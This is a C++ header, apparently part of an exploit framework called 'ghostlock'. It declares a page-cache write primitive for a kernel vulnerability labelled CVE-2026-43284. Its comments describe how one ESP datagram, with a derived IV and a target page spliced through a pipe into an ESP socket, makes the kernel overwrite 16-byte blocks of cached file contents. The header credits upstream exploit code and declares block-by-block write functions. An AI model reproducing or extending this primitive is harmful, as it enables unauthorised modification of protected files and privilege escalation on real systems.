#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_PAGECACHE_PAGECACHE_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_PAGECACHE_PAGECACHE_HPP

/* B5-3 page-cache write primitive for CVE-2026-43284.
 *
 * One ESP datagram writes exactly one 16-byte file page-cache block. The write
 * reads the current block (that read is the CBC ciphertext too), derives
 * IV = AES256_ECB_DEC(K, old) XOR desired, frames
 * SPI(4) | Seq(4) | IV(16) | ciphertext(16) | ICV(icv_len), splices the target
 * page into a pipe and splices that pipe to the ESP socket so the kernel
 * decrypts in place over the shared page. write_block applies the same step to
 * a span of blocks, advancing the file offset by 16 bytes per block.
 *
 * Every syscall comes from the injected pagecache::SpliceIoOps (see
 * splice_io.hpp), so the whole core is host-testable and has no direct syscall
 * dependency. The mapping to third_party/dirtyfrag/usermode/ankit/exp.c
 * (compute_iv, read_vendor_content, do_one_write_cbc, patch_file_cbc),
 * lspromise/splicehelper.c and dirtyinit/dfi_exploit.c is in
 * docs/analysis/cve-2026-43284-refactor-plan.md. The upstream repositories ship
 * no LICENSE, so this is an independent rewrite with attribution.
 *
 * contract::FileCacheWriteOps is the neutral capability: availability is
 * derived from the returned handle (its write16 pointer), never a separate
 * flag. Reads of the old content, the patch chain, hook computation, triggering
 * and cleanup stay backend-private.
 *
 * ADR-0004 R1: this is a backend submodule header and must not include
 * pipeline/. */

#include "backend/cve_2026_43284/ipsec/ipsec.hpp"
#include "backend/cve_2026_43284/pagecache/splice_io.hpp"
#include "contract/capabilities.hpp"

#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43284 {

    inline constexpr std::size_t kPageCacheBlockBytes = 16U;

    /* Result of one write/read. Zero is success; every failure is a distinct
     * non-zero code so callers can tell "nothing was written" from "part of the
     * span was written". */
    enum class WriteResult : std::int32_t {
        Ok = 0,
        InvalidArgument = 1,
        NotAvailable = 2,
        IoError = 3,
        ShortRead = 4,
        ShortWrite = 5,
        PartialWrite = 6,
    };

    struct PageCacheWriteStats final {
        std::uint32_t blocks_written = 0U;
        std::uint32_t blocks_failed = 0U;
        std::uint32_t datagrams_sent = 0U;
    };

    /* Caller-owned state for one page-cache write session. It holds the session
     * secrets (IpsecSaParams), the target file fd, the connected ESP socket fd
     * and the injected syscall surface; none of that leaks into the capability.
     * Availability is derived from these fields (see page_cache_ready in the
     * implementation), not stored as a flag. */
    struct PageCacheWriteContext final {
        IpsecSaParams sa{};
        int file_fd = -1;
        int socket_fd = -1;
        std::uint32_t next_seq = 1U;
        int pipe_flags = 0;
        pagecache::SpliceIoOps io{};
        /* Optional alternate source for the old 16-byte block. Unbound keeps
         * the direct file_fd read; vendor carriers bind the crash_dump bridge
         * here after the direct read fails (real_ops.cpp). */
        pagecache::OldPageSource old_page{};
        /* Optional alternate source for the ciphertext page. Unbound keeps the
         * direct file_fd splice; a vendor carrier the App cannot open at all
         * binds the crash_dump helper here (real_ops.cpp). */
        pagecache::HelperWriteSource helper_write{};
        PageCacheWriteStats stats{};
    };

    /* One 16-byte page-cache write at file_offset. Returns WriteResult::Ok or a
     * non-zero failure. Reads the old block through ctx.io.read_at, then sends
     * exactly one ESP datagram through the pipe/splice surface. */
    [[nodiscard]] WriteResult write16(PageCacheWriteContext &ctx,
                                      std::uint64_t file_offset,
                                      const std::uint8_t bytes16[16]) noexcept;

    /* Block sequence: writes len bytes from bytes starting at file_offset, one
     * write16 per 16-byte block, advancing file_offset by 16 each time. len
     * must be a multiple of 16; len == 0 is a no-op Ok. A null bytes with
     * len > 0, or a non-multiple len, is InvalidArgument before any write. A
     * failure after the first block returns PartialWrite while
     * ctx.stats.blocks_written/blocks_failed record how far it got. */
    [[nodiscard]] WriteResult write_block(PageCacheWriteContext &ctx,
                                          std::uint64_t file_offset,
                                          const std::uint8_t *bytes,
                                          std::size_t len) noexcept;

    /* Reads the current 16-byte block (the CBC ciphertext). */
    [[nodiscard]] WriteResult read_block(PageCacheWriteContext &ctx,
                                         std::uint64_t file_offset,
                                         std::uint8_t out[16]) noexcept;

    /* Adapter to the neutral capability. Returns an unavailable handle (null
     * write16) unless ctx.io.available(), both fds and sa.icv_len are valid. */
    [[nodiscard]] contract::FileCacheWriteOps
    make_file_cache_write_ops(PageCacheWriteContext &ctx) noexcept;

    /* Wipes the session secrets held by ctx through the same non-elidable
     * volatile-store path as zeroize(IpsecSaParams&). The fds and io surface are
     * not secret. */
    void zeroize(PageCacheWriteContext &ctx) noexcept;

} // namespace ghostlock::backend::cve_2026_43284

#endif
